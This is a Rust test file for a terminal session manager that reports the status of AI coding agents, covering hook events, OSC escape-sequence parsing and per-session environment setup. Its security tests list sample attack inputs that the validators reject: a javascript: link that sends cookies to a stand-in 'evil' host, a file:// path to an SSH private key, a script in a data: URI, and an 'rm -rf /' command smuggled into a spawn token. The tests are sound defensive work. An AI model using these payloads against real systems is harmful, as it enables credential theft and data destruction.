// SPDX-FileCopyrightText: 2026 Alexey Zhokhov
// SPDX-License-Identifier: Apache-2.0

use super::*;

#[test]
fn opencode_event_sets_complete_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event("hook-opencode-1", "opencode", "permission.asked", None, now);
    let a = session.authority.as_ref().expect("authority set");
    assert_eq!(a.source_id, "hook-opencode-1");
    assert_eq!(a.mapped_state, RawAgentState::Blocked);
    assert!(a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Complete);
}

#[test]
fn claude_event_never_sets_authority() {
    // Decision 0a: Claude/Codex are identity-only; their events never produce
    // a semantic authority — state comes from the screen pack + watchdog.
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-claude-1",
        "claude",
        "Stop",
        None,
        std::time::Instant::now(),
    );
    assert!(session.authority.is_none());
}

#[test]
fn claude_notification_permission_sets_partial_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-claude-1",
        "claude",
        "Notification:permission_prompt",
        None,
        std::time::Instant::now(),
    );
    let a = session.authority.as_ref().expect("authority set");
    assert_eq!(a.source_id, "hook-claude-1");
    assert_eq!(a.mapped_state, RawAgentState::Blocked);
    assert!(a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Partial);
}

#[cfg(feature = "codex-app-server-authority")]
#[test]
fn codex_app_server_event_sets_complete_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "app-server-codex-1",
        "codex-app-server",
        "turn/started",
        None,
        std::time::Instant::now(),
    );
    let a = session.authority.as_ref().expect("authority set");
    assert_eq!(a.source_id, "app-server-codex-1");
    assert_eq!(a.mapped_state, RawAgentState::Working);
    assert!(!a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Complete);
}

#[test]
fn clear_event_drops_authority_for_source() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "tool.execute.before",
        None,
        now,
    );
    assert!(session.authority.is_some());
    session.apply_runtime_event("hook-opencode-1", "opencode", "session.error", None, now);
    assert!(session.authority.is_none());
}

#[test]
fn clear_from_other_source_leaves_authority() {
    // A Clear from a different source_id must not drop the live authority — the
    // source guard keeps one reporter from clearing another's state.
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "tool.execute.before",
        None,
        now,
    );
    session.apply_runtime_event("hook-opencode-2", "opencode", "session.error", None, now);
    let a = session.authority.as_ref().expect("authority survives");
    assert_eq!(a.source_id, "hook-opencode-1");
}

#[test]
fn heartbeat_from_other_source_does_not_refresh_last_event() {
    use std::time::Duration;
    let mut session = test_session_with_policy(OscPolicy::default());
    let t0 = std::time::Instant::now();
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "tool.execute.before",
        None,
        t0,
    );
    let original = session.authority.as_ref().unwrap().last_event;
    // A heartbeat (claude lifecycle event) from a different source must not
    // refresh source-1's freshness, or a stale authority could outlive its TTL.
    session.apply_runtime_event(
        "hook-claude-9",
        "claude",
        "PreToolUse",
        None,
        t0 + Duration::from_secs(5),
    );
    assert_eq!(session.authority.as_ref().unwrap().last_event, original);
}

#[test]
fn amp_event_sets_partial_authority() {
    use crate::agent_status::evidence::AuthorityGrade;
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-amp-1",
        "amp",
        "tool-start",
        None,
        std::time::Instant::now(),
    );
    let a = session.authority.as_ref().expect("amp authority set");
    // amp has partial lifecycle coverage, so it cannot author at full confidence.
    assert_eq!(a.grade, AuthorityGrade::Partial);
}

#[test]
fn osc_title_captured_and_capped() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let long = "x".repeat(400);
    session.feed_pty(format!("\x1b]2;{long}\x07").as_bytes());
    let osc = session.osc_evidence();
    assert_eq!(
        osc.title.as_ref().map(|t| t.chars().count()),
        Some(256),
        "title retained and capped at 256 chars"
    );
}

#[test]
fn osc94_progress_active_then_clear() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]9;4;1;50\x07");
    assert!(
        session.osc_evidence().progress_active,
        "OSC 9;4 state 1 marks progress active"
    );
    session.feed_pty(b"\x1b]9;4;0\x07");
    assert!(!session.osc_evidence().progress_active);
    assert!(session.osc_evidence().progress_cleared_at.is_some());
}

#[test]
fn osc133_marks_set_shell_state() {
    use crate::agent_status::evidence::RawAgentState;
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]133;C\x07");
    assert_eq!(
        session.osc_evidence().shell_state,
        Some(RawAgentState::Working)
    );
    assert!(session.osc_evidence().shell_state_marked_at.is_some());
    session.feed_pty(b"\x1b]133;B\x07");
    assert_eq!(
        session.osc_evidence().shell_state,
        Some(RawAgentState::Idle)
    );
}

#[test]
fn osc_status_evidence_survives_every_pty_split_and_keeps_wire_order() {
    use crate::agent_status::evidence::RawAgentState;
    let wire = b"\x1b]133;B\x07\x1b]133;C\x1b\\\x1b]133;A\x07\x1b]9;4;1;50\x07\x1b]9;4;0\x1b\\";
    for split in 0..=wire.len() {
        let mut session = test_session_with_policy(OscPolicy::default());
        session.feed_pty(&wire[..split]);
        session.feed_pty(&wire[split..]);
        assert_eq!(
            session.osc_evidence().shell_state,
            Some(RawAgentState::Working),
            "split {split}"
        );
        assert_eq!(
            session.osc_evidence().progress_raw.as_deref(),
            Some("4;0"),
            "split {split}"
        );
        assert!(!session.osc_evidence().progress_active, "split {split}");
        assert!(session.osc_evidence().progress_cleared_at.is_some());
    }
}

#[test]
fn osc_status_partial_evidence_is_private_to_its_session() {
    use crate::agent_status::evidence::RawAgentState;
    let mut first = test_session_with_policy(OscPolicy::default());
    let mut second = test_session_with_policy(OscPolicy::default());
    first.feed_pty(b"\x1b]133;C\x1b");
    assert!(first.osc_evidence().shell_state.is_none());
    assert!(first.osc_evidence().shell_state_marked_at.is_none());
    second.feed_pty(b"\\");
    assert!(second.osc_evidence().shell_state.is_none());
    first.feed_pty(b"\\");
    assert_eq!(
        first.osc_evidence().shell_state,
        Some(RawAgentState::Working)
    );
    first.feed_pty(b"\x1b]133;D;0\x07\x1b]133;A\x07");
    assert_eq!(first.osc_evidence().shell_state, Some(RawAgentState::Idle));
}

#[test]
fn process_evidence_unavailable_without_child_pid() {
    // Test sessions have no real child PID; sampling must report "no physics"
    // (never a false exit), so the watchdog can't demote off this evidence.
    let mut session = test_session_with_policy(OscPolicy::default());
    let ev = session.sample_process_evidence(std::time::Instant::now());
    assert!(!ev.physics_sampled);
    assert!(!ev.process_exited);
    assert!(!ev.foreground_is_agent);
}

#[test]
fn clear_runtime_authority_drops_state_and_counters() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "permission.asked",
        None,
        std::time::Instant::now(),
    );
    assert!(session.authority.is_some());
    session.clear_runtime_authority();
    assert!(session.authority.is_none());
    assert_eq!(session.subagents_active, 0);
}

#[test]
fn agent_session_gets_status_reporter_env() {
    let mut cmd = CommandBuilder::new("/bin/true");
    inject_status_env(&mut cmd, 42, Some("codex"), None, "test-capability");
    let get = |k| cmd.get_env(k).and_then(|v| v.to_str());
    assert_eq!(get(jackin_protocol::SESSION_ID_ENV), Some("42"));
    assert_eq!(get(jackin_protocol::ISOLATION_SESSION_ID_ENV), Some("42"));
    assert_eq!(get("JACKIN_AGENT_RUNTIME"), Some("codex"));
    assert_eq!(get("JACKIN_STATUS_SOURCE"), Some("hook-codex-42"));
    assert_eq!(get("JACKIN_STATUS_SOCKET"), Some("/jackin/run/jackin.sock"));
    assert_eq!(
        get(jackin_protocol::SESSION_CAPABILITY_ENV),
        Some("test-capability")
    );
    assert_eq!(get("TMPDIR"), Some("/jackin/run/sessions/42/tmp"));
    assert_eq!(
        get("JACKIN_SESSION_STATE_DIR"),
        Some("/jackin/run/sessions/42/state")
    );
    assert_eq!(get("XDG_CACHE_HOME"), Some("/jackin/run/sessions/42/cache"));
}

#[test]
fn configured_xdg_cache_root_overrides_session_cache() {
    let mut cmd = CommandBuilder::new("/bin/true");
    inject_status_env(
        &mut cmd,
        42,
        Some("amp"),
        Some("/home/agent/.cache/amp"),
        "test-capability",
    );
    assert_eq!(
        cmd.get_env("XDG_CACHE_HOME")
            .and_then(|value| value.to_str()),
        Some("/home/agent/.cache/amp")
    );
}

#[test]
fn shell_session_gets_private_paths_and_no_agent_status_identity() {
    let mut cmd = CommandBuilder::new("/bin/zsh");
    inject_status_env(&mut cmd, 7, None, None, "shell-capability");
    assert!(cmd.get_env(jackin_protocol::SESSION_ID_ENV).is_none());
    assert_eq!(
        cmd.get_env(jackin_protocol::ISOLATION_SESSION_ID_ENV)
            .and_then(|v| v.to_str()),
        Some("7")
    );
    assert!(cmd.get_env("JACKIN_AGENT_RUNTIME").is_none());
    assert!(cmd.get_env("JACKIN_STATUS_SOURCE").is_none());
    assert_eq!(
        cmd.get_env("JACKIN_STATUS_SOCKET").and_then(|v| v.to_str()),
        Some("/jackin/run/jackin.sock")
    );
    assert_eq!(
        cmd.get_env(jackin_protocol::SESSION_CAPABILITY_ENV)
            .and_then(|v| v.to_str()),
        Some("shell-capability")
    );
}

#[test]
fn osc8_uri_empty_is_safe() {
    // Empty URI = link terminator; must always pass.
    assert!(osc8_uri_is_safe(""));
}

#[test]
fn osc8_uri_http_https_mailto_pass() {
    assert!(osc8_uri_is_safe("http://example.com"));
    assert!(osc8_uri_is_safe("https://example.com"));
    assert!(osc8_uri_is_safe("HTTPS://EXAMPLE.COM"));
    assert!(osc8_uri_is_safe("mailto:foo@example.com"));
}

#[test]
fn osc8_uri_unsafe_schemes_rejected() {
    // The threat scenarios the allowlist is here to block.
    assert!(!osc8_uri_is_safe(
        "javascript:fetch('//evil/?'+document.cookie)"
    ));
    assert!(!osc8_uri_is_safe("file:///Users/operator/.ssh/id_rsa"));
    assert!(!osc8_uri_is_safe(
        "data:text/html,<script>alert(1)</script>"
    ));
    assert!(!osc8_uri_is_safe("ssh://server"));
}

#[test]
fn validate_spawn_token_syntax_rejects_typical_attacks() {
    validate_spawn_token_syntax("").unwrap_err();
    validate_spawn_token_syntax("--debug").unwrap_err();
    validate_spawn_token_syntax("claude\n; rm -rf /").unwrap_err();
    validate_spawn_token_syntax("claude codex").unwrap_err();
    validate_spawn_token_syntax("claude\0").unwrap_err();
}

#[test]
fn validate_spawn_token_syntax_accepts_well_formed_tokens() {
    validate_spawn_token_syntax("claude").unwrap();
    validate_spawn_token_syntax("work@claude").unwrap();
    validate_spawn_token_syntax("codex").unwrap();
}

#[test]
fn child_exit_reason_clean_exit_is_none() {
    let status = portable_pty::ExitStatus::with_exit_code(0);
    assert_eq!(child_exit_reason(Ok(&status)), None);
}

#[test]
fn child_exit_reason_nonzero_code_reports_code() {
    let status = portable_pty::ExitStatus::with_exit_code(137);
    assert_eq!(
        child_exit_reason(Ok(&status)).as_deref(),
        Some("session process exited with code 137")
    );
}

#[test]
fn child_exit_reason_signal_reports_signal() {
    let status = portable_pty::ExitStatus::with_signal("SIGKILL");
    assert_eq!(
        child_exit_reason(Ok(&status)).as_deref(),
        Some("session process exited after signal SIGKILL")
    );
}

#[test]
fn child_exit_reason_wait_error_reports_failure() {
    let err = std::io::Error::other("boom");
    let reason = child_exit_reason(Err(&err)).expect("a wait error must yield a reason");
    assert!(reason.starts_with("session process wait failed:"));
    assert!(reason.contains("boom"));
}
